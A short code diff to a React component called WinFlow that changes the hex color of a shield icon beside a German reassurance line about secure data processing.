@@ -227,7 +227,7 @@ export function WinFlow({ sessionId }: Props) {
 
               <div className="flex flex-col gap-2 pt-1 sm:gap-4 sm:pt-2 md:flex-row md:items-center md:justify-between">
                 <div className="pak-form-security">
-                  <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <svg className="h-9 w-9 shrink-0 text-[#ffd200]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                     <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                   </svg>
                   <span>Ihre Daten werden sicher verarbeitet.</span>
